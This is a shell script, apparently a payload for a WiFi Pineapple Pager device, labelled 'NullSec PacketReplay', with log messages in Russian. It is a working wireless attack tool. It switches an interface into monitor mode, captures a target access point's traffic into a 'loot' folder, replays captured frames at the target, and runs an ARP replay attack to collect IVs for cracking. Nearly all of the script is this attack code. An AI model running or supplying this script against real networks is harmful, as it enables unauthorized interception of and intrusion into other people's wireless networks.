#!/bin/sh
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
. /root/payloads/library/nullsec-ui.sh
#####################################################
# NullSec PacketReplay Payload
# Захват и повтор интересных пакетов
#####################################################
# Автор: Команда NullSec
# Цель: WiFi Pineapple Pager
# Категория: Injection/Replay
#####################################################

PAYLOAD_NAME="PacketReplay"
source /root/payloads/library/nullsec-lib.sh 2>/dev/null || true

# Configuration
TARGET_BSSID="${TARGET_BSSID:-$1}"
TARGET_CHANNEL="${TARGET_CHANNEL:-${2:-6}}"
MONITOR_INTERFACE="wlan1mon"
LOOT_DIR="/root/loot/replay"
LOG_FILE="$LOOT_DIR/replay_$(date +%Y%m%d_%H%M%S).log"
MODE="${3:-capture}"  # capture, replay, arp

mkdir -p "$LOOT_DIR"

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "[!] Остановка повтора пакетов..."
    killall airodump-ng aireplay-ng tcpreplay 2>/dev/null
    airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null
    exit 0
}

trap cleanup INT TERM

log "=========================================="
log "   NullSec PacketReplay v1.0"
log "=========================================="

if [ -z "$TARGET_BSSID" ] && [ "$MODE" != "list" ]; then
    echo "Использование: $0 <target_bssid> [канал] [режим]"
    echo "Режимы: capture, replay, arp, list"
    echo ""
    echo "Примеры:"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 capture  - Захват пакетов"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 replay   - Повтор захваченных пакетов"
    echo "  $0 AA:BB:CC:DD:EE:FF 6 arp      - ARP атака повтором"
    echo "  $0 list                          - Список захваченных пакетов"
    exit 1
fi

# Setup monitor mode
airmon-ng start wlan1 2>/dev/null
sleep 2
iwconfig "$MONITOR_INTERFACE" channel "$TARGET_CHANNEL" 2>/dev/null

case "$MODE" in
    capture)
        log "[*] Режим: Захват пакетов"
        log "[*] Цель: $TARGET_BSSID (Канал $TARGET_CHANNEL)"
        log "[*] Захват интересных пакетов..."
        
        CAPTURE_FILE="$LOOT_DIR/capture_${TARGET_BSSID//:/}_$(date +%Y%m%d_%H%M%S)"
        
        # Capture with filters for interesting traffic
        airodump-ng "$MONITOR_INTERFACE" \
            -c "$TARGET_CHANNEL" \
            --bssid "$TARGET_BSSID" \
            --write "$CAPTURE_FILE" \
            --output-format pcap 2>/dev/null &
        DUMP_PID=$!
        
        log "[*] Захват... Нажмите Ctrl+C для остановки"
        log "[*] Вывод: $CAPTURE_FILE"
        
        # Also capture with tcpdump for more detail
        tcpdump -i "$MONITOR_INTERFACE" -w "${CAPTURE_FILE}_detailed.pcap" \
            "ether host $TARGET_BSSID" 2>/dev/null &
        
        wait $DUMP_PID
        ;;
        
    replay)
        log "[*] Режим: Повтор пакетов"
        
        # Find latest capture
        LATEST_CAP=$(ls -t "$LOOT_DIR"/*.cap 2>/dev/null | head -1)
        
        if [ -z "$LATEST_CAP" ]; then
            log "[!] Файлы захвата не найдены. Сначала запустите режим capture."
            exit 1
        fi
        
        log "[*] Повтор: $LATEST_CAP"
        log "[*] Цель: $TARGET_BSSID"
        
        # Replay packets
        aireplay-ng -2 -r "$LATEST_CAP" -b "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | tee -a "$LOG_FILE"
        ;;
        
    arp)
        log "[*] Режим: ARP Атака повтором"
        log "[*] Цель: $TARGET_BSSID (Канал $TARGET_CHANNEL)"
        
        # Start capture for IVs
        CAPTURE_FILE="$LOOT_DIR/arp_attack_$(date +%Y%m%d_%H%M%S)"
        airodump-ng "$MONITOR_INTERFACE" \
            -c "$TARGET_CHANNEL" \
            --bssid "$TARGET_BSSID" \
            --write "$CAPTURE_FILE" \
            --output-format pcap 2>/dev/null &
        
        sleep 3
        
        log "[*] Запуск ARP атаки повтором..."
        log "[*] Ожидание ARP пакета..."
        
        # ARP replay - wait for packet then replay
        aireplay-ng -3 -b "$TARGET_BSSID" "$MONITOR_INTERFACE" 2>&1 | while read line; do
            log "$line"
            if echo "$line" | grep -q "got"; then
                log "[+] ARP пакет захвачен, повтор..."
            fi
        done
        ;;
        
    list)
        log "[*] Захваченные файлы пакетов:"
        echo ""
        ls -lh "$LOOT_DIR"/*.cap "$LOOT_DIR"/*.pcap 2>/dev/null | while read line; do
            echo "  $line"
        done
        echo ""
        TOTAL=$(ls -1 "$LOOT_DIR"/*.cap "$LOOT_DIR"/*.pcap 2>/dev/null | wc -l)
        log "[*] Всего захватов: $TOTAL"
        ;;
        
    *)
        log "[!] Unknown mode: $MODE"
        exit 1
        ;;
esac

log "[+] PacketReplay завершен"
